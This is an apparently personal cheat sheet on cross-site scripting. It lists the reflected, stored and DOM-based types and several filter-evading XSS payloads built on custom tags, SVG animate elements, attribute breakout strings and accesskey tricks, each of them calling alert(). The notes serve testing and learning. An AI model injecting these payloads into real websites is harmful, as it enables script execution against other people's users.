XSS

* Cross Origin iframes are prevented from calling alert() from version 92 onward. Alternatively, print() function can be used for detection.


Three Types Of XSS

-> Reflected: Malicious script comes from current HTTP request
-> Stored Malicious script comes from the DB
-> Dom-based: Exists in the client-side code rather than server-side code


XSS Payloads

-> Custom tag: <xss autofocus tabindex=1 onfocus=alert(1)></xss>

-> <svg><animatetransform onbegin=alert(1) attributeName=transform>

-> By using "animate" tag, we can dynamically set attribute and values.
Example payload: 
<svg><a><animate attributeName="href" values="javascript:alert()"></animate> <text font-size="16" x="0" y="16">Click</text></a></svg>

-> If we can terminate the attribute value but cannot escape the tag, we can use a payload similar to the following:

 " autofocus onfocus=alert(document.domain) x="

-> I have injected the above payload inside "input" tag and it worked.

-> javascript:alert() payload is used when user supplied input is directly placed into href tag. 

-> We can make use of canonical tags for XSS detection. 
Example payloads: 
- <input type="hidden" accesskey="X" onclick="alert(1)">
- <link rel="canonical" accesskey="X" onclick="alert(1)" />
But user is required to press some extra keyboard buttons to trigger the XSS payload.
